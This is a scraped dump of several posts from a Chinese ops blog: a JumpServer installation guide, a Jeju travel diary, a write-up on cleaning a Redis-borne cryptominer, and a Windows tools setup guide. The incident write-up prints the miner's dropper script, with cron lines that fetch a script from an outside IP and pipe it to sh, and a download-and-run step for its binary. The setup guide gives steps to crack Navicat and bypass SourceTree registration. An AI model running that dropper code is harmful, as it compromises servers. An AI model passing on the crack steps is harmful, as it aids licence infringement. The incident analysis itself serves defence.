cd jumpserver \u0026amp;\u0026amp; git checkout master \u0026amp;\u0026amp; git pull $ echo \u0026quot;source /data/opt/py3/bin/activate\u0026quot; \u0026gt; /data/opt/jumpserver/.env # 进入 jumpserver 目录时将自动载入 python 虚拟环境 $ cd /data/opt/ $ git clone https://github.com/jumpserver/coco.git \u0026amp;\u0026amp; cd coco \u0026amp;\u0026amp; git checkout master \u0026amp;\u0026amp; git pull $ echo \u0026quot;source /data/opt/py3/bin/activate\u0026quot; \u0026gt; /data/opt/coco/.env # 进入 coco 目录时将自动载入 python 虚拟环境 # 安装依赖 RPM 包 $ yum -y install $(cat /data/opt/jumpserver/requirements/rpm_requirements.txt) $ yum -y install $(cat /data/opt/coco/requirements/rpm_requirements.txt) # 安装 Python 库依赖 $ pip install --upgrade pip $ pip install -r /data/opt/jumpserver/requirements/requirements.txt -i https://pypi.python.org/simple $ pip install -r /data/opt/coco/requirements/requirements.txt -i https://pypi.python.org/simple # 修改 Jumpserver 配置文件 $ cd /data/opt/jumpserver $ cp config_example.py config.py $ vi config.py # 注意对齐，不要直接复制本文档的内容，实际内容以文件为准，本文仅供参考 注意: 配置文件是 Python 格式，不要用 TAB，而要用空格\n\u0026quot;\u0026quot;\u0026quot; jumpserver.config ~~~~~~~~~~~~~~~~~ Jumpserver project setting file :copyright: (c) 2014-2017 by Jumpserver Team :license: GPL v2, see LICENSE for more details. \u0026quot;\u0026quot;\u0026quot; import os BASE_DIR = os.path.dirname(os.path.abspath(__file__)) class Config: # Use it to encrypt or decrypt data # Jumpserver 使用 SECRET_KEY 进行加密，请务必修改以下设置 # SECRET_KEY = os.environ.get('SECRET_KEY') or '2vym+ky!997d5kkcc64mnz06y1mmui3lut#(^wd=%s_qj$1%x' SECRET_KEY = '请随意输入随机字符串（推荐字符大于等于 50位）' # Django security setting, if your disable debug model, you should setting that ALLOWED_HOSTS = ['*'] # DEBUG 模式 True为开启 False为关闭，默认开启，生产环境推荐关闭 # 注意：如果设置了DEBUG = False，访问8080端口页面会显示不正常，需要搭建 nginx 代理才可以正常访问 DEBUG = os.environ.get(\u0026quot;DEBUG\u0026quot;) or False # 日志级别，默认为DEBUG，可调整为INFO, WARNING, ERROR, CRITICAL，默认INFO LOG_LEVEL = os.environ.get(\u0026quot;LOG_LEVEL\u0026quot;) or 'WARNING' LOG_DIR = os.path.join(BASE_DIR, 'logs') # 使用的数据库配置，支持sqlite3, mysql, postgres等，默认使用sqlite3 # See https://docs.djangoproject.com/en/1.10/ref/settings/#databases # 默认使用SQLite3，如果使用其他数据库请注释下面两行 # DB_ENGINE = 'sqlite3' # DB_NAME = os.path.join(BASE_DIR, 'data', 'db.sqlite3') # 如果需要使用mysql或postgres，请取消下面的注释并输入正确的信息,本例使用mysql做演示(mariadb也是mysql) DB_ENGINE = os.environ.get(\u0026quot;DB_ENGINE\u0026quot;) or 'mysql' DB_HOST = os.environ.get(\u0026quot;DB_HOST\u0026quot;) or '127.0.0.1' DB_PORT = os.environ.get(\u0026quot;DB_PORT\u0026quot;) or 3306 DB_USER = os.environ.get(\u0026quot;DB_USER\u0026quot;) or 'jumpserver' DB_PASSWORD = os.environ.get(\u0026quot;DB_PASSWORD\u0026quot;) or 'weakPassword' DB_NAME = os.environ.get(\u0026quot;DB_NAME\u0026quot;) or 'jumpserver' # Django 监听的ip和端口，生产环境推荐把0.0.0.0修改成127.0.0.1，这里的意思是允许x.x.x.x访问，127.0.0.1表示仅允许自身访问 # ./manage.py runserver 127.0.0.1:8080 HTTP_BIND_HOST = '127.0.0.1' HTTP_LISTEN_PORT = 8080 # Redis 相关设置 REDIS_HOST = os.environ.get(\u0026quot;REDIS_HOST\u0026quot;) or '127.0.0.1' REDIS_PORT = os.environ.get(\u0026quot;REDIS_PORT\u0026quot;) or 6379 REDIS_PASSWORD = os.environ.get(\u0026quot;REDIS_PASSWORD\u0026quot;) or '' REDIS_DB_CELERY = os.environ.get('REDIS_DB') or 3 REDIS_DB_CACHE = os.environ.get('REDIS_DB') or 4 def __init__(self): pass def __getattr__(self, item): return None class DevelopmentConfig(Config): pass class TestConfig(Config): pass class ProductionConfig(Config): pass # Default using Config settings, you can write if/else for different env config = DevelopmentConfig() # 修改 Coco 配置文件 $ cd /data/opt/coco $ cp conf_example.py conf.py $ vi conf.py # 注意对齐，不要直接复制本文档的内容 注意: 配置文件是 Python 格式，不要用 TAB，而要用空格\n#!/usr/bin/env python3 # -*- coding: utf-8 -*- # import os BASE_DIR = os.path.dirname(__file__) class Config: \u0026quot;\u0026quot;\u0026quot; Coco config file, coco also load config from server update setting below \u0026quot;\u0026quot;\u0026quot; # 项目名称, 会用来向Jumpserver注册, 识别而已, 不能重复 # NAME = \u0026quot;localhost\u0026quot; NAME = \u0026quot;coco\u0026quot; # Jumpserver项目的url, api请求注册会使用, 如果Jumpserver没有运行在127.0.0.1:8080，请修改此处 # CORE_HOST = os.environ.get(\u0026quot;CORE_HOST\u0026quot;) or 'http://127.0.0.1:8080' CORE_HOST = 'http://127.0.0.1:8080' # 启动时绑定的ip, 默认 0.0.0.0 # BIND_HOST = '0.0.0.0' # 监听的SSH端口号, 默认2222 # SSHD_PORT = 2222 # 监听的HTTP/WS端口号，默认5000 # HTTPD_PORT = 5000 # 项目使用的ACCESS KEY, 默认会注册,并保存到 ACCESS_KEY_STORE中, # 如果有需求, 可以写到配置文件中, 格式 access_key_id:access_key_secret # ACCESS_KEY = None # ACCESS KEY 保存的地址, 默认注册后会保存到该文件中 # ACCESS_KEY_STORE = os.path.join(BASE_DIR, 'keys', '.access_key') # 加密密钥 # SECRET_KEY = None # 设置日志级别 ['DEBUG', 'INFO', 'WARN', 'ERROR', 'FATAL', 'CRITICAL'] # LOG_LEVEL = 'INFO' LOG_LEVEL = 'WARN' # 日志存放的目录 # LOG_DIR = os.path.join(BASE_DIR, 'logs') # Session录像存放目录 # SESSION_DIR = os.path.join(BASE_DIR, 'sessions') # 资产显示排序方式, ['ip', 'hostname'] # ASSET_LIST_SORT_BY = 'ip' # 登录是否支持密码认证 # PASSWORD_AUTH = True # 登录是否支持秘钥认证 # PUBLIC_KEY_AUTH = True # SSH白名单 # ALLOW_SSH_USER = 'all' # ['test', 'test2'] # SSH黑名单, 如果用户同时在白名单和黑名单，黑名单优先生效 # BLOCK_SSH_USER = [] # 和Jumpserver 保持心跳时间间隔 # HEARTBEAT_INTERVAL = 5 # Admin的名字，出问题会提示给用户 # ADMINS = '' COMMAND_STORAGE = { \u0026quot;TYPE\u0026quot;: \u0026quot;server\u0026quot; } REPLAY_STORAGE = { \u0026quot;TYPE\u0026quot;: \u0026quot;server\u0026quot; } # SSH连接超时时间 (default 15 seconds) # SSH_TIMEOUT = 15 # 语言 = en LANGUAGE_CODE = 'zh' config = Config() # 安装 Web Terminal 前端: Luna 需要 Nginx 来运行访问 访问（https://github.com/jumpserver/luna/releases）下载对应版本的 release 包，直接解压，不需要编译 $ cd /data/opt $ wget https://github.com/jumpserver/luna/releases/download/1.4.1/luna.tar.gz $ tar xvf luna.tar.gz $ chown -R root:root luna # 配置 Nginx 整合各组件 $ vim /etc/nginx/conf.d/jumpserver.conf server { listen 80; client_max_body_size 100m; # 录像上传大小限制 location /luna/ { try_files $uri / /index.html; alias /data/opt/luna/; # luna 路径，如果修改安装目录，此处需要修改 } location /media/ { add_header Content-Encoding gzip; root /data/opt/jumpserver/data/; # 录像位置，如果修改安装目录，此处需要修改 } location /static/ { root /data/opt/jumpserver/data/; # 静态资源，如果修改安装目录，此处需要修改 } location /socket.io/ { proxy_pass http://localhost:5000/socket.io/; # 如果coco安装在别的服务器, 请填写它的ip proxy_buffering off; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026quot;upgrade\u0026quot;; proxy_set_header X-Real-IP $remote_addr; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; access_log off; } location /guacamole/ { proxy_pass http://localhost:8081/; # 如果docker安装在别的服务器, 请填写它的ip proxy_buffering off; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection $http_connection; proxy_set_header X-Real-IP $remote_addr; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; access_log off; } location / { proxy_pass http://localhost:8080; # 如果jumpserver安装在别的服务器, 请填写它的ip proxy_set_header X-Real-IP $remote_addr; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } } # 生成数据库表结构和初始化数据 $ cd /data/opt/jumpserver/utils $ bash make_migrations.sh # 运行 Jumpserver $ cd /data/opt/jumpserver $ ./jms start all # 后台运行使用 -d 参数./jms start all -d # 新版本更新了运行脚本，使用方式./jms start|stop|status|restart all 后台运行请添加 -d 参数 # 运行 Coco $ cd /data/opt/coco $ ./cocod start # 后台运行使用 -d 参数./cocod start -d # 新版本更新了运行脚本，使用方式./cocod start|stop|status|restart 后台运行请添加 -d 参数 # 运行 Nginx $ nginx -t # 确保配置没有问题, 有问题请先解决 $ service nginx start # 访问 http://xx.xx.xx.xx (注意，没有 :8080，通过 nginx 代理端口进行访问) # 默认账号: admin 密码: admin 到会话管理-终端管理 接受 Coco Guacamole 等应用的注册 # 测试连接 $ ssh -p2222 admin@xx.xx.xx.xx $ sftp -P2222 admin@xx.xx.xx.xx 密码: admin ##当然密码已经改了 # 如果是用在 Windows 下，Xshell Terminal 登录语法如下 $ ssh admin@xx.xx.xx.xx 2222 $ sftp admin@xx.xx.xx.xx 2222 密码: admin 如果能登陆代表部署成功 # sftp默认上传的位置在资产的 /tmp 目录下 # 其他的ssh及sftp客户端这里就不多做说明，自行搜索使用 ","permalink":"https://www.fenghong.tech/blog/2018/2018-09-14-jumpserver/","tags":["Linux","jumpServer","mariaDB","Coco","Python"],"title":"jumpServer安装"},{"categories":["living"],"contents":"济州岛旅游攻略(偏日记, 图片省略) requirement  无线随身wifi(不用换电话号码. 国外没网就等于瞎子) 身份证, 护照, 手机 机票和住宿, 建议打印, 提前准备规划好. 电气设备如充电宝, 充电线 女生常备如化妆品, 衣服, 洗漱用品, 毛巾, 防嗮袖套 男生常备如剃须刀, 如果有坐飞机耳鸣状态, 请带好耳塞 韩元: 如果没有现金会稍微麻烦点, 建议去银行去兑换. 楼主5天花了6000多人民币, 共计: 100W韩元.(不包括免税店化妆品,免税店直接用微信, 银行卡, 支付宝了)  随身app  建议下载google地图 下载google翻译 淘宝.方便牛岛一日游  出行线路  出发篇  2018年7月31日下午, 到达上海站. 因为机票时间很早, 且国外航班提前3小时达到机场, 得住机场附近, 住的浦东机场附近的一家airbnb, 主人家真的很不错, 接送服务就很nice,\n我们是早上7点45登机, 所以晚上很早就睡了, 得提前三小时办理相关手续. 这里赞一下辛苦的司机大叔,早上四点钟就在那边等我们, 为了把我们送到机场！\n机票时间 2018-08-01 7:45 - 9:15 济州岛时间是是晚一小时的. 其实过去就到了10点15了. 预留时间3个小时肯定够的. 但是千万别晚了. 碰到一些小意外可以有足够的时间处理 登机过程很快,我们必须去取Wi-Fi(因为是在网上买的, 浦东机场是可以在机场直取的. 第一次去的话可能比较绕.需要找一下.)\n 出境及海关  再去办理登机手续, 行李托运, 这个因为前面人蛮多, 排了大概20分钟吧! 办理好登机手续, 发现时间剩余还有很多, 我们便去星巴克吃了一份简便的早餐, 正常价位.\n然后开始过海关, 我毕竟第一次出国, 海关人员那里就看了我一眼, 问都没有问, 就放我过去了, 费力准备的行程单, 住宿单, 都没有用上, 但是备上这些东西也有底气多了.\ntips: 进海关这里花了很长时间, 主要是人多, 排了差不多40分钟, 这里最好预留1个半小时以上, 因为后面还要登机时间, 登机差不多也要20分钟吧, 春秋航空的飞机里我们太远, 还得坐机场大巴赶过去, 机场大巴很宽大, 但是人多仍然很拥挤.\n上了飞机之后就是准备起飞落地jeju了, 我最机智的媳妇儿提前给我准备了耳塞, 超级贴心, 我坐过一次飞机, 因为耳朵耳鸣问题, 都不想再坐飞机了, 带了耳塞后, 耳朵好受了很多; 济州和上海很近, 一个小时就到了, 下了飞机, 出来就是取行李加入境, 这个过程花了大概一个小时, 因为取行李要等蛮久的, 而且不熟悉.\n 入境  拿完行李之后, 就准备入境了, 一个警察牵着一只警犬来检查行李箱, 嗅了一圈就放我们过去了, 出了飞机场, 我们按照攻略买了公交卡, 就在gata2的东北gs25便利店, 充了2w韩元, 其实冲少了, 应该多充2w(因为发现后面用到公交卡还是蛮多的), 因为不熟悉, 所以才充的比较少, 出门机场gate5, 就是公交的地方, 这里我再被自己愚蠢到了, 按照图示都不会走, 唉！这里浪费了30分钟才到达了目的地, 因为公交站显示的是大站点,小站点是不予显示的\n辗转了差不多1小时, 就到了airbnb的民宿家里, 房间很小, 但是很干净, 不过就是床有声音, 睡觉会嘎吱响, 我们没想到和主人共住, 而且有一个小孩, 这点都让我想退房然后另寻他处了, 毕竟很不方便, 而且打开门就看到房东就很尴尬; 后面还是住下了, 因为我们大部分都是在外面玩, 其实也碰不到房子主人.\n第一站: 山君不离 中午随便出门吃了点当地的冷面, 很辣眼睛, 不重口的千万别尝试, 然后我们下午去了第一个风景区——山君不离, 一个火山口, 济州最大的特点就是火山很多,\n山君不离很美, 我们拍了很多风景照, 山君不离这个景点很特色, 中间低, 四周高的一个火山, 而且我们是坐公交去的, 公交车从来就没有准确到站过, 要不提前一站, 要不就是延后了一站, 实在是没明白韩国公交的提示;\n领略了大自然美景, 大概三小时后, 我们就公交返回了, 返程的路上, 突然发现一个很繁华的地带, 然后就提前下车了(不知道这个点在哪\u0026hellip;楼主觉得韩文就是鬼画符),（我们用的随身Wi-Fi, 而且没有带安卓线出门）这边的小吃很有意思, 其实人均150元感觉是专门照顾中国人的, 像一些本土的餐厅还是很便宜的, 而且分量巨多, 记忆最深的就是寿司, 20个寿司, 只要3000韩元, 根本吃不完, 晚上吃了超级多美食, 人均只有30左右吧！\n吃完饭后, 差不多逛了一下周围的环境, 然后就准备回去了, 这个时候发现随身Wi-Fi没电了, 那意味着我们没有网络, 而且不知道路标的意思, 而且没有英文提示, 只有优美而迷人的韩文(鬼画符), 只好凭借自己的记忆加缓存地图走回去了; 不过还好, 我们离住的地方只有1公里左右, 不一会儿, 我们就回家了！ 然后开始第二天的规划(当场规划的, 用的淘宝买的牛岛一日游).\n第二站: 牛岛一日游(值,必须要玩) 2018/08/02 出门一点要带好护照,某些景点需要用到护照\n 景点之一: 牛岛  早上起来看到房东给我们煮的营养早餐, 感觉自己的心情瞬间就变得很好了, 房东的早餐每天都不一样, 很赞！\n今天计划是淘宝一天游牛岛, 感觉很划算（体验之后）, 司机是一个97年的小年轻, 国语和韩语都很溜, 同行的还有另外四个人, 一行七人花了一个小时从济州区来到牛岛, 司机朋友还给我们买了当地的橘子（司机自己掏腰包）, 很客气而且友善, 还帮我们做了翻译, 这个韩国司机很赞. 来到了牛岛售票处,我们买了船票(需要用到护照).\n大概20分钟的船程就上岛了, 船上的风景很漂亮, 因为牛岛实在是太漂亮了, 上岸之后, 租自行车骑行(也可以上大巴车换岛), 我们开始环形牛岛, 还好是电动自行车, 不然得累个半死, 牛岛环行过程中, 即停即拍, 随处可见美景, 当然选择大巴车的, 就不能随时随地欣赏. 骑自行车可以随停随拍.\n济州岛的海水真的很蓝很绿, 在其中一个小景点拍了很有意思的照片, 以前我都不知道怎么用连拍, 你告诉了我怎么用, 而且教会了我怎么抓拍跳跃, 棒棒哒！\n环岛过程中, 有一处天然断崖绝壁, 下面刚好有一个小游艇, 有人在水面上画心表白,很浪漫, 环行牛岛之后, 就准备去下一个景点了, 途中和司机随便吃了点东西.\n 景点之二: 城山日出峰(名字都怪怪的)  第二个景点, 城山日出峰, 据当地人说. 新年的第一天都有人来排队爬山, 好像是那种虔诚的信徒, 每年必做之事, 然而城山日出峰只有那么大, 先到先得, 在那边占位置, 好在我们不是新年过来的.\n我们花了一个小时到了城山日出峰, 上面的景色很开阔, 自然景观真的比人工的风景更好, 更大气, 山上人很少, 不用排队,\ntips: 在韩国另一好处就是人少, 很多景点感觉像只有自己在玩一样, 而且特别开阔！景色和电影中的根本没有区别, 海水很蓝而且绿！下山后差不多快到四点了, 准备下一个景点.\n 景点之三: 涉地可支(这个名字??)  我们启程去第三个景点, 涉地可支, 这个景点也很美, 很具有韩国特色, 但是对游客不怎么友好, 大门距离景点太远, 而且路途中还有沙地\u0026hellip;不过为了美景还是必须要赶过去！花费了20分钟左右, 就到达景点了.\n这个景点类似一个灯塔, 在灯塔上看海景！玩了三个景点, 也累的不行, 准备坐车回家, 结束一天的行程, 回家过程中和司机小伙聊天, 了解了一下这边的吃的情况, 而且还充当了我们的翻译！为这个年轻的司机点赞~\n 晚上: 东门市场(算是比较有名气的地方了)  晚上我们来到了黑猪肉一条街, 吃了第一顿烤肉——豚, 听你说这家很有名气, 我们就进去了, 烤肉的风格和国内的不同, 很有特色的烤盘, 点菜啥的是司机小哥帮忙解决的(加了小哥的微信), 吃完烤肉就出门看了一下东门市场,\n东门市场也算是济州岛比较有名的地方, 一条街, 全部是吃的东西, 人很多, 但是因为我们刚吃完饭, 根本吃不下这边的小吃, 然后打算第二天再来. 吃饭完开启逛街模式, 逛街了一会发现时间也差不多到10点了, 东门市场门店差不多都关门了\u0026hellip;所以只能去另外地方了——韩国济州岛的酒吧街.\n韩国的酒吧街和国人的一样. 不过酒吧街里面很多门店感觉是国人开的！稍微玩了一下差不多就回去了！玩了一天, 很累, 洗完衣服就准备睡觉了(夏天过去衣服很快就干了)！\n第三站: 中文旅游区(济州岛南部) 2018/08/03\n房东又为我们准备了营养丰富的早餐, 很开心, 一份早餐真的能影响一个人的心情！\n今天的目的地是济州岛的南部, 也就是有名的中文旅游区, 我们第一次坐公交做对站的公交, 韩国公交的报站很迷~~~, 这次的公交差不多要1w韩元,所以我说在机场的那边公交钱冲少了.\n中文旅游区——里面基本博物馆居多, 信不信由你, 泰迪熊博物馆, 天地源瀑布, 柱状节理 等.\n我们中午吃饭吃的是炸鸡, 附近的已经炸鸡店, 点菜是按照人均150的来点, 真的很郁闷网上的个人均问题, 其实这边人均50差不多就能吃饱吃好！ 我们这次点了三个菜, 点多了\u0026hellip;吃饱之后就去看了信不信由你博物馆.\n 玩点之一: 信不信由你  感觉很不错的博物馆, 里面的信息量比较大, 很多不知道的东西, 甚至刷新自己的认知, 增长自己的见识, 我觉得信不信由你, 是一个值得看的地方. 看完博物馆, 便打车去了柱状节理(大概只有2公里, 不想走路了).\n 玩点之二: 柱状节理(必去. 景点超级赞)  我们去看了柱状节理, 门票非常便宜, 2000韩元, 差不多十几块钱, 也是韩国济州岛有名的地方,这里海景图真的是非常的赞！\n海水深绿色, 带上天然的柱状节理, 承托出的风景, 不是人工合成能达到的效果; 国内虽然有柱状节理, 但是人很多, 而且需要排队, 当天我看到同学去华山风景区, 结果上山就排了三个小时的队伍！可怕,所以说出国旅游真的是很机智的选择, 国内暑假和寒假还是待在家或者出国, 不然无尽的等待和排队！\n逛完柱状节理后, 旁边刚好有一个写明信片的小摊, 然后我们互相给对方写了一张明信片(1年多了还没收到, 坑爹~)！写完明信片之后, 我们就坐着公交回去了, 回到市区差不多6点.\n 晚上: 性爱乐园  然后我们去看了性爱乐园, 里面各种性相关的东西, 这里未成年, 各种姿势, 各种器具, 各种方法, 很有意思\u0026hellip;..花了大概2小时不到, 我们就逛完整个性爱乐园…看完感觉韩国人真的很开放！\n 晚上: 东门市场  差不多到7点多, 我们回到了昨天的东门市场, 人依旧很多, 吃了一份烤肉饭, 花了很长时间排队, 我们以为排队人多的应该很好吃, 结果并没有想象的那么好吃\u0026hellip;吃完烤肉饭我就去逛街了, 买鞋子,进去看了一下, 你比较喜欢凉鞋, 而我喜欢拖鞋, 因为凉鞋会打后脚跟, 很不舒服, 我喜欢的那款鞋子只有女款,特难受. 想去超级市场看一下, 发现这边都下班了, 只得作罢(如果想买点东西, 建议赶早), 便回去洗澡洗衣服睡觉了.\n第四站: 汉拿山计划 (未完待续) 2018/08/04\n计划爬汉拿山, 但是由于体力不支, 计划被delay了, 其实我就想在牛岛那边的海岸游个泳, 那边的海很赞.\n带着遗憾然后就来市区这边的海岸浴场游泳了, 当然前提是要有泳裤啥的, 买泳裤成了一个麻烦事情, 韩国普通便利店是没有这些东西的, 我就问了airbnb上的男主人, 其实我俩英文都不好, 然后互相沟通了一下, 大意他告诉我要去大型超市买, 让我坐taxi过去. 我们便去了超市, 最后买了一套游泳装备, 买完东西准备去游泳的地方, 超市下面有出租车, 司机很遵守秩序, 排队候车, 赞一下韩国的司机, 很守秩序\n 游泳( 完全是我想去游泳的\u0026hellip;.)  去游泳, 牛岛的那个司机小伙推荐我们去附近的海水浴场, 人蛮多, 而且有警戒人员, 防止游的过深, 海里面游泳真的和游泳池完全不一样, 海水很咸,特别咸！你在岸边看观望着我, 其实海里游泳很难受, 不小心呛口水能难受半死, 游了差不多一个多小时, 我们便离开了这里,\n 逛免税店及意外受伤买药  新罗免税店附近逛街, 逛街主要是闲逛居多, 我当时是想坐车回家的, 你说你走的屁股疼, 还是坚持要做公交, 回到名宿后, 我就决定去买点药, 查了Google地图, 寻找药店的位置, 然后出门买药, 其实在韩国买药还是很有挑战性的,一个是买对药,二个是别人给对药,三个是找到药店,花了10分钟找药店,花了20分钟和店员解释我需要买什么,最后他还是明白了我的需求. 快步跑回去,然后洗澡后,给你上药,应该是有点效果吧？我心里也没底…… 而且今天还忘记了钥匙,丢了钥匙,因为存了三四次包裹,可能就在某次丢的钥匙,感觉很对不起房东,让她特意跑回来给我们开门.\n第五站: 返程 2018/08/05\n要点: 免税店的东西早点买, 因为去机场拿货人超级多\n返程的日子, 每次返程都感觉没玩够呢, 晚上的飞机返航, 我们最后一天的计划是免税店购物, 起床收拾行李, 最后忘记了你的洗面奶, 那个洗面奶我以为是民宿主人家的,闹了个大乌龙！下次收拾行李一定得两个人一起看. 收拾完行李, 就打的过来新罗免税店, 打的费用还可以报销, 去问一下就知道怎么报销了, 在免税店楼下问了一个韩国人, 问他存包处, 结果发现免税店没有这个服务, 只好推着箱子去买化妆品了.\n化妆品实在是太多了, 眼花缭乱, 语言已经难以形容了. 先去四楼办理会员卡(招商银行), 还可以打9折, 很不错, 能减则减; 买完东西后, 出门吃了午餐, 午餐随便去了一家店, 随便吃完就立马回去继续购物, 买完后也差不多到6点多,准备吃晚饭然后去机场办理登机手续.\n晚餐吃的是一家烤肉店, 味道很好, 和在国内的感觉一模一样, 而且比国内的吃法正宗. 晚餐吃的很满足. 明显比中午好多了！而且人均大概90,不是很贵, 吃完晚饭就打车去机场了, 韩国济州岛的机场不大, 很容易找到点, 不像浦东机场, 太大了. 到机场就是退公交卡, 把剩下的韩元花完, 然后办理登机业务. 这里不得不提一下, 春秋航空排队人少, 去的时候就直接办理了, 很快速！\n接下来就是出境, 领取免税店物品, 登机, 领取免税店东西的时候人超级多, 我怕我们都赶不上登机了, 结果新罗免税店的效率还很高,一会儿就到我们了,这里建议买东西要早一点, 不然你上了飞机, 免税店的东西还没领到, 完美领完所有的免税商品, 办理登机, 飞机飞回上海很快,一个小时就到了,到了上海开始取行李,还Wi-Fi,我们回到机场已经到晚上11:30了, 所以决定还是继续在浦东机场附近住一晚上, 第二天再回去.\n","permalink":"https://www.fenghong.tech/blog/living/jeju/","tags":["jeju","tour"],"title":"济州岛旅游日记"},{"categories":["ops"],"contents":"问题发现及解决 ​\t在ucloud使用redis，开启了6379端口，但是当时并没有对redis的密码进行设置复杂的设置，设置的为123456。\n使用top命令查询，发现cpu异常占用过高。99%以上\n​\tqW3xT.2程序和ddgs.3013程序，看起来就不是正常的程序。google了一下，发现是美国的一个挖矿程序。\n​\t进入/tmp文件夹下。发现qW3xT.2文件，删除。之后kill掉qW3xT.2该进程，但是一段时间之后，发现该行程又重新启动。\n​\t一段时间之后，删除的文件重新生成，dds和挖矿的进程又重新执行。此时怀疑是否有计划任务，此时查看计划任务的列表\n$ find / -name qW3xT.2 $ find / -name ddgs.3013 $ crontab -l */15 * * * * curl -fsSL http://149.56.106.215:8000/i.sh | sh $ cd /var/spool/cron/ $ rm -rf * $ crontab -l ##任务计划清除完毕。 ​\t分析一下挖矿脚本\n$ curl -fsSL http://149.56.106.215:8000/i.sh | sh export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin echo \u0026quot;\u0026quot; \u0026gt; /var/spool/cron/root echo \u0026quot;*/15 * * * * curl -fsSL http://149.56.106.215:8000/i.sh | sh\u0026quot; \u0026gt;\u0026gt; /var/spool/cron/root echo \u0026quot;*/15 * * * * wget -q -O- http://149.56.106.215:8000/i.sh | sh\u0026quot; \u0026gt;\u0026gt; /var/spool/cron/root mkdir -p /var/spool/cron/crontabs echo \u0026quot;\u0026quot; \u0026gt; /var/spool/cron/crontabs/root echo \u0026quot;*/15 * * * * curl -fsSL http://149.56.106.215:8000/i.sh | sh\u0026quot; \u0026gt;\u0026gt; /var/spool/cron/crontabs/root echo \u0026quot;*/15 * * * * wget -q -O- http://149.56.106.215:8000/i.sh | sh\u0026quot; \u0026gt;\u0026gt; /var/spool/cron/crontabs/root ps auxf | grep -v grep | grep /tmp/ddgs.3013 || rm -rf /tmp/ddgs.3013 if [ ! -f \u0026quot;/tmp/ddgs.3013\u0026quot; ]; then wget -q http://149.56.106.215:8000/static/3013/ddgs.$(uname -m) -O /tmp/ddgs.3013 curl -fsSL http://149.56.106.215:8000/static/3013/ddgs.$(uname -m) -o /tmp/ddgs.3013 fi chmod +x /tmp/ddgs.3013 \u0026amp;\u0026amp; /tmp/ddgs.3013 ps auxf | grep -v grep | grep Circle_MI | awk '{print $2}' | xargs kill ps auxf | grep -v grep | grep get.bi-chi.com | awk '{print $2}' | xargs kill ps auxf | grep -v grep | grep hashvault.pro | awk '{print $2}' | xargs kill ps auxf | grep -v grep | grep nanopool.org | awk '{print $2}' | xargs kill ps auxf | grep -v grep | grep minexmr.com | awk '{print $2}' | xargs kill ps auxf | grep -v grep | grep /boot/efi/ | awk '{print $2}' | xargs kill #ps auxf | grep -v grep | grep ddg.2006 | awk '{print $2}' | kill #ps auxf | grep -v grep | grep ddg.2010 | awk '{print $2}' | kill ​\t解决redis入口问题，因为最开始没有设置密码，所以首先修改redis.conf。设置密码，然后重启redis。\n总结 ​\t知名应用程序的端口应避免使用默认端口，认证密码应稍微复杂，避免使用888888,123456等简单密码。\n","permalink":"https://www.fenghong.tech/blog/2018/2018-09-07-qw3xt2/","tags":["Linux","problem","qW3xT","hack"],"title":"记一次挖矿病毒处理qW3xT.2"},{"categories":["ops"],"contents":"一、Navicat for mysql 下载地址： Navicat Premium（64 bit）简体中文版：http://xiazai.formysql.com/trial/navicat_premium_trial_64.exe\nNavicat Premium Mac版：http://download3.navicat.com/download/navicat111_premium_cs.dmg\nNavicat for MySQL（64 bit）简体中文版：http://xiazai.formysql.com/trial/navicat_x64_trial.exe\nNavicat for MySQL Mac版：http://download3.navicat.com/download/navicat111_mysql_cs.dmg\nNavicat for SQL Server（64 bit）简体中文版：http://xiazai.formysql.com/trial/navicat_sqlserver_trial_64.exe\n解压,安装\n破解，https://download.csdn.net/download/qq_39238554/10285323\n1.安装原版的Navicat for MySQL 记住安装目录，有用 2.把“PatchNavicat.exe”文件放到软件安装目录下 3.运行PatchNavicat.exe 4.选择Navicat主程序navicat.exe为其打上补丁即可。 5.破解后启动软件，不会再提醒要需要注册了 二、Xshell/Xftp下载安装 下载\nXshell6：https://www.netsarang.com/products/xsh_overview.html\nXftp6： https://www.netsarang.com/products/xfp_overview.html\n下载完毕后，点击安装，按需安装至相关文件夹\n使用\n1.打开桌面的Xshell，进行软件首界面，选择新建 2.填写名称、协议、主机号和端口号，点击确定按钮 3.进入会话对话框，选择要连接的账户，点击连接按钮 4.输入用户登录名，点击确定按钮 5.输入登录密码，点击确定，连接成功 三、git安装 从官网下载：https://git-scm.com/downloads\n安装即可\n右击鼠标，出现Git Gui Here 和Git Bash Here,说明安装成功\n全局设置,点击Git Bash Here.进入命令行界面。\n$ git config --global user.name \u0026quot;Your Name\u0026quot; $ git config --global user.email \u0026quot;email@example.com\u0026quot; 四、Sourcetree安装 安装好Git后，可以安装Sourcetree了\n下载软件地址：https://www.sourcetreeapp.com/\n\u0026mdash;\u0026mdash;\u0026gt;Download\n下载好后，直接进行安装，这里需要跳过注册\n在windows资源管理器里输入%LocalAppData%\\Atlassian\\SourceTree\\\n新建一个accounts.json，内容如下，保存重启 [ { \u0026quot;$id\u0026quot;: \u0026quot;1\u0026quot;, \u0026quot;$type\u0026quot;: \u0026quot;SourceTree.Api.Host.Identity.Model.IdentityAccount, SourceTree.Api.Host.Identity\u0026quot;, \u0026quot;Authenticate\u0026quot;: true, \u0026quot;HostInstance\u0026quot;: { \u0026quot;$id\u0026quot;: \u0026quot;2\u0026quot;, \u0026quot;$type\u0026quot;: \u0026quot;SourceTree.Host.Atlassianaccount.AtlassianAccountInstance, SourceTree.Host.AtlassianAccount\u0026quot;, \u0026quot;Host\u0026quot;: { \u0026quot;$id\u0026quot;: \u0026quot;3\u0026quot;, \u0026quot;$type\u0026quot;: \u0026quot;SourceTree.Host.Atlassianaccount.AtlassianAccountHost, SourceTree.Host.AtlassianAccount\u0026quot;, \u0026quot;Id\u0026quot;: \u0026quot;atlassian account\u0026quot; }, \u0026quot;BaseUrl\u0026quot;: \u0026quot;https://id.atlassian.com/\u0026quot; }, \u0026quot;Credentials\u0026quot;: { \u0026quot;$id\u0026quot;: \u0026quot;4\u0026quot;, \u0026quot;$type\u0026quot;: \u0026quot;SourceTree.Model.BasicAuthCredentials, SourceTree.Api.Account\u0026quot;, \u0026quot;Username\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;Email\u0026quot;: null }, 